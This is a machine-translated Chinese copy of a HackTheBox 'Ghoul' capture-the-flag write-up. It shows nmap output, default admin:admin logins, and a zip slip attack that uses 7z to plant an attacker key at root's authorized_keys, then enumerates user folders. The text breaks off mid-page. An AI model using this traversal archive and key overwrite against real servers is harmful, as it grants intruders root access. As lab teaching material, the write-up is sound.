<html>
<head>
<title>HacktheBox — Ghoul</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子——食尸鬼</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-ghoul-deb77ff43326?source=collection_archive---------0-----------------------#2019-10-05">https://infosecwriteups.com/hackthebox-ghoul-deb77ff43326?source=collection_archive---------0-----------------------#2019-10-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="3c98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何解决黑客盒子里的食尸鬼的文章。</p><p id="e4d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="1484" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/d462b62b5e5e05f6300886c49bfb2e69.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*OYl1fPUYwRBu8zgfBXKIkQ.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">hackthebox.eu</figcaption></figure><h1 id="e7c4" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated"><strong class="ak">关于盒子</strong></h1><p id="edcc" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">食尸鬼在黑客盒子上的评分很高。这是东京食尸鬼的灵感，它涉及旋转和隧道。这也迫使你记下旅途中遇到的许多事情。总的来说，我学到了技术/攻击，并且能够学到很多关于SSH的知识。网络图如下所示:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/25a24857202a106b2ef590029e08e74c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JJzeNfeqSkBG0ktyi81pIg.png"/></div></div></figure><h1 id="d759" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated"># TL速度三角形定位法(dead reckoning)</h1><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="df85" class="ml kz iq mh b gy mm mn l mo mp"><strong class="mh ir">Initial foothold -&gt; User:</strong> An authenticated blog with guessable credentials leads to an image and zip upload page. I perform a zip slip attack to overwrite root’s authorized keys to ssh as root in the machine Aogiri. <br/><strong class="mh ir">Root:</strong> I then enumerate and find a password for an ssh key to log in to kaneki-pc, which has access to a Gogs server. I tunnel the Gogs server to my machine and perform an RCE exploit, leading to 7z file which contains the root password for the kaneki-pc. I then hijack an SSH session on port 2222 to get root.txt.</span></pre><h1 id="155b" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">#最初的立足点</h1><p id="6caf" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我首先对机器执行nmap扫描</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="4686" class="ml kz iq mh b gy mm mn l mo mp">nmap -sV -sC -oA nmap/initial 10.10.10.101</span></pre><p id="71ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="832b" class="ml kz iq mh b gy mm mn l mo mp">Nmap scan report for 10.10.10.101<br/>Host is up (0.30s latency).<br/>Not shown: 996 closed ports<br/>PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)<br/>|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)<br/>80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br/>|_http-server-header: Apache/2.4.29 (Ubuntu)<br/>|_http-title: Aogiri Tree<br/>2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)<br/>|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)<br/>|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)<br/>8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1<br/>| http-auth: <br/>| HTTP/1.1 401 Unauthorized\x0D<br/>|_  Basic realm=Aogiri<br/>|_http-server-header: Apache-Coyote/1.1<br/>|_http-title: Apache Tomcat/7.0.88 - Error report<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="3884" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我注意到有2个ssh服务(端口22和2222)和2个web页面(端口80和端口8080)。请注意，端口8080要求领域Aogiri上的基本身份验证。我首先检查端口80。</p><h2 id="50a1" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">端口80</h2><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nb"><img src="../Images/faaa5372b50e695962cc7c2bd4c1183a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kRxDkkeUfH525LC2dQK1ZA.png"/></div></div></figure><p id="95bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在列举端口80时，我感兴趣的是一个名为Admin的用户写的博客。因此，如果我遇到一个登录页面，我会尝试使用admin用户名和一些常用密码。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nc"><img src="../Images/c4c44261d2a60528674710425e27fa0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gFvJGamYHAe4v5HNts_vvw.png"/></div></div></figure><p id="f0d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在端口80上运行dirsearch.py:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nd"><img src="../Images/82f82dae8f0b5f92a9473682e7a23827.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*A-fC_6_sgUxz1jlQiIiT4Q.png"/></div></div></figure><p id="a471" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我找到一个/users/login.php。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ne"><img src="../Images/f0d5f75f5b55694422e27b2a74c816ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lb0GMr0wFWuUvalb6qE1gw.png"/></div></div></figure><p id="f97f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试通用凭据:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nf"><img src="../Images/58f13da41df0f5f0227fef2bdbb3d5c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_x_pyyI_SiVq9VWz_dCp-A.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">管理员:管理员</figcaption></figure><p id="329c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我已经尝试了其他凭据，但不起作用。我移动到8080端口。</p><h2 id="2223" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">端口8080</h2><p id="de70" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">正在检查端口8080，它要求对领域Aogiri进行身份验证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ng"><img src="../Images/2dd531e1bbb8b979a373d12bf9dc2c18.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wc4nMIXYBLbmKhYQoZfqfw.png"/></div></div></figure><p id="cd9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了端口8080，它需要认证。尝试普通密码，组合管理:管理工作。</p><h2 id="1c6b" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">网页(端口8080)</h2><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nh"><img src="../Images/2710837379180002c4a92cc8cd151b9f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hwu_wEBgEcKl1rQ4pUHwBg.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">图像上传</figcaption></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ni"><img src="../Images/304337b2584695b20f205bcf6d393720.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FDOSLYnvWnUUOuJeWnGiVQ.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">Zip上传</figcaption></figure><p id="e53c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到它允许上传图片和压缩文件到服务器。我首先上传一张简单的照片，并检查它允许上传的图像格式。我试着上传一张简单的jpeg图片。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/b8fb3e819bfdb7f437298bb055327c9a.png" data-original-src="https://miro.medium.com/v2/resize:fit:884/format:webp/1*13rfzt-lSznSKi26ugbmSQ.png"/></div></figure><p id="4463" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">成功上传后，页面被重定向到/img。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nk"><img src="../Images/d356797fee73a6a6c511d29a17d933b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*joER9deYh-haUgYNX2wiaA.png"/></div></div></figure><p id="7c08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试一个GET请求:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nl"><img src="../Images/c6063d0d5560544e8df34b9e82d07c2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kLrA1d2IO3Mi229xm6xedA.png"/></div></div></figure><p id="14a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不支持HTTP方法get。</p><p id="efe3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我检查上传是如何进行的:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nm"><img src="../Images/cb10135c92bea6f66a6b1d2748a10d47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_D1F1sQwlP8PHvzkKTne0w.png"/></div></div></figure><p id="a426" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没什么有趣的。因为不允许GET，所以我通过Burp检查哪些HTTP动词是允许的。我发送了一个选项请求来检查哪些HTTP动词是允许的。只允许POST、TRACE和OPTIONS动词:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nn"><img src="../Images/c7d68f9cee657d94d72abcdb63382686.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kQDG1jNcdCeGxh3cNNf9wA.png"/></div></div></figure><p id="4187" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还会检查上传的内容是否放在/img下。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi no"><img src="../Images/da418852b237540223baede632c1e647.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7pp1eCg4X5tFk95IF_uqsQ.png"/></div></div></figure><p id="928e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以尝试上传文件，但如果我不知道我是否能访问这些文件，那就没有意义了。然后，我继续进行zip上传。我创建了一个包含图片的zip文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi np"><img src="../Images/d67500924e650e999a8fc44c2d77aa33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Xyyc3AHORbMG7g3BLIqNHQ.png"/></div></div></figure><p id="91f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试将zip文件上传到服务器。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nq"><img src="../Images/d25ebcab0b1d49f472472ffa88753240.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iJBP_Ycull0RA72B-qOHbw.png"/></div></div></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nr"><img src="../Images/d018b8989567d6ee9c7f88f5cd3611a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tG9aSGQgCxAlVTWPQTbEvA.png"/></div></div></figure><p id="af85" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我测试了上传是否到/upload/images.zip。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ns"><img src="../Images/24b454e38ad0bcb1e367dfdf3f29e8f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1pLVdCrK0nNKyIJ1QfjrXg.png"/></div></div></figure><p id="2745" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">意识到我可以上传文件，但不能识别它被上传到哪里，我检查它是否容易受到zip slip攻击。我最近在另一个盒子里使用了这个技术。</p><h2 id="9434" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">拉链条</h2><p id="a7b3" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我在这台机器上使用了zip slip攻击。基本上:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="797c" class="ml kz iq mh b gy mm mn l mo mp">"Zip Slip is a form of directory traversal that can be exploited by  extracting files from an archive. The premise of the directory traversal  vulnerability is that an attacker can gain access to parts of the file  system outside of the target folder in which they should reside."</span></pre><p id="51bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">知道我可以上传zip文件，我寻找例子并找到了这个链接:</p><p id="0e77" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://github.com/snyk/zip-slip-vulnerability" rel="noopener ugc nofollow" target="_blank">https://github.com/snyk/zip-slip-vulnerability</a></p><p id="05c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以在此阅读更多关于zip slip攻击的信息:</p><div class="nt nu gp gr nv nw"><a href="https://snyk.io/research/zip-slip-vulnerability" rel="noopener  ugc nofollow" target="_blank"><div class="nx ab fo"><div class="ny ab nz cl cj oa"><h2 class="bd ir gy z fp ob fr fs oc fu fw ip bi translated">Snyk - Zip Slip漏洞</h2><div class="od l"><h3 class="bd b gy z fp ob fr fs oc fu fw dk translated">Zip Slip是一个广泛存在的任意文件覆盖关键漏洞，通常会导致远程命令…</h3></div><div class="oe l"><p class="bd b dl z fp ob fr fs oc fu fw dk translated">snyk.io</p></div></div><div class="of l"><div class="og l oh oi oj of ok ks nw"/></div></div></a></div><p id="6af3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是来自Github库的示例:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ol"><img src="../Images/8f7cc04d2a4d621666ca8eaf6b11df67.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IYdKnnAszl96qZJKfhcitw.png"/></div></div></figure><p id="43d5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我试着上传一个zip文件，希望它能在服务器上“写”文件。目的是覆盖根用户的授权密钥。</p><h2 id="a42f" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated"><strong class="ak">创建密钥对</strong></h2><p id="36de" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我使用ssh-keygen创建了一个密钥对。这将产生一个私钥和公钥对。注意，为了能够在机器中使用ssh，您的公钥应该是用户主目录下authorized_keys文件中的一个条目。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi om"><img src="../Images/55eb290bdec9922cf36a13e69bc5c62f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X9E8dU7RgyfmjEwaDkd3mA.png"/></div></div></figure><p id="9b19" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我下载了zip-slip.zip示例，创建了一个authorized_keys文件，并将其添加到下载的归档文件中，然后为zip-slip.zip攻击重命名该文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi on"><img src="../Images/799adef4d26098332d550eb1d89c241b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9xycWH_H3-jVbkeXA-K5-Q.png"/></div></div></figure><p id="d292" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我创建了一个authorized_keys文件，并将其添加到下载的归档文件中，然后将该文件重命名为zip-slip.zip攻击。</p><p id="ee8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">重命名文件:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="eefe" class="ml kz iq mh b gy mm mn l mo mp">root@kali:~/Documents/htb/boxes/ghoul/zipslip# mv ghoul_htb.pub authorized_keys</span></pre><p id="f742" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将文件添加到zip-slip存档:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="0ac8" class="ml kz iq mh b gy mm mn l mo mp">                                                                    <br/>root@kali:~/Documents/htb/boxes/ghoul/zipslip# 7z a zip-slip.zip authorized_keys                                                             <br/>&lt;-redacted-&gt;                                                                                                                                                      </span></pre><p id="904c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我检查zip文件的内容:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="2543" class="ml kz iq mh b gy mm mn l mo mp">root@kali:~/Documents/htb/boxes/ghoul/zipslip# 7z l zip-slip.zip</span><span id="c26a" class="ml kz iq mh b gy oo mn l mo mp">Date      Time    Attr         Size   Compressed  Name<br/>------------------- ----- ------------ ------------  ------------------------<br/>2018-04-15 22:04:42 .....           20           20  ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../.<br/>./../../../../../../../tmp/evil.txt<br/>2019-10-03 01:25:32 .....          563          459  authorized_keys<br/>2018-04-15 19:04:29 .....           19           19  good.txt<br/>------------------- ----- ------------ ------------  ------------------------<br/>2019-10-03 01:25:32                602          498  3 files</span></pre><p id="6d1e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用适当的文件名重命名了归档中的authorized_keys文件。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="6cb4" class="ml kz iq mh b gy mm mn l mo mp">root@kali:~/Documents/htb/boxes/ghoul/zip# 7z rn zip-slip.zip authorized_keys '../../../../../../../../../../root/.ssh/authorized_keys'</span></pre><p id="2905" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我列出zip文件的内容，检查我是否正确地重命名了该文件:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi op"><img src="../Images/bcbdb7f11772d48ab337aedc84e6e363.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T-ewq3lrEz-N-WLGp88MWw.png"/></div></div></figure><p id="f24b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">由于一切正常，我上传了zip文件:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi oq"><img src="../Images/3cb77a7133aecc6ed0214dd894cfe92a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vEJrIxJgc_NCG-THNFLtXQ.png"/></div></div></figure><p id="de74" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试使用私钥ssh到这个盒子，然后用我用来保护它的密码进行验证，我以“root@Aogiri”的身份进入</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi or"><img src="../Images/8cfc69ac92717017a1fb41184d7bf766.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*epUiqKxBupaHmwbwLK9SuQ.png"/></div></div></figure><p id="a0fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查/root/目录中有什么。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi os"><img src="../Images/f3b39e7cd3fb1caa246ab7712c45937e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fEEPh4yth5JkF4d8HJwKPg.png"/></div></div></figure><p id="77a1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我检查/home/ director中的用户是谁:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="db26" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/home# ls -al<br/>total 36<br/>drwxr-xr-x 1 root   root   4096 Dec 13  2018 .<br/>drwxr-xr-x 1 root   root   4096 Dec 13  2018 ..<br/>drwx------ 1 Eto    Eto    4096 Dec 13  2018 Eto<br/>drwx------ 1 kaneki kaneki 4096 Dec 13  2018 kaneki<br/>drwx------ 1 noro   noro   4096 Dec 13  2018 noro<br/>root@Aogiri:/home#</span></pre><p id="4552" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我发现有3个用户文件夹，即Eto，kaneki和noro。</p><h2 id="8934" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">兼木</h2><p id="3e23" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我检查了kaneki文件夹里的东西。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ot"><img src="../Images/fd63e2c00ea588d9b6a1835867b05424.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Bfbz9iA39nuE9G3hYwwBsg.png"/></div></div></figure><p id="84a9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">阅读kaneki文件夹下的文件，我可以找到user.txt和一些关于Gogs漏洞的注释，以及一个测试帐户的存在。它还说一个文件服务器在服务器的网络中，kaneki可以访问它。</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="b9a7" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/home/kaneki# cat note.txt <br/>Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.<br/>root@Aogiri:/home/kaneki# cat notes <br/>I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.<br/>DM me for the access.<br/>root@Aogiri:/home/kaneki# wc -c user.txt <br/>33 user.txt<br/>root@Aogiri:/home/kaneki# cat user.txt <br/>7c0f11041.....<br/></span></pre><p id="4563" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我检查了kaneki的authorized_keys，看看谁可以作为kaneki在这台机器上ssh。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ou"><img src="../Images/a35cafa9047f926b8b57dfdfb1c0ba17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*saeZ28Mqf7WOOFZvaCXvyw.png"/></div></div></figure><p id="ba8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到一个条目kaneki_pub@kaneki-pc。这表示名为kaneki_pub的用户可以通过ssh登录到该机器。我记下了用户名kaneki_pub。</p><h2 id="471a" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">european theatre of operations 欧洲战区</h2><p id="fcb7" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">列举Eto的主目录，我没有发现什么有用的东西:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ov"><img src="../Images/794dc6f4de17b30d86976ea9ac5bb745.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gUW_t-4lrYeeYQ-P50z0oQ.png"/></div></div></figure><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="7144" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:/home/Eto# cat alert.txt <br/>Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!</span></pre><h2 id="0749" class="ml kz iq bd la mq mr dn le ms mt dp li jy mu mv lm kc mw mx lq kg my mz lu na bi translated">诺罗</h2><p id="4f9b" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly 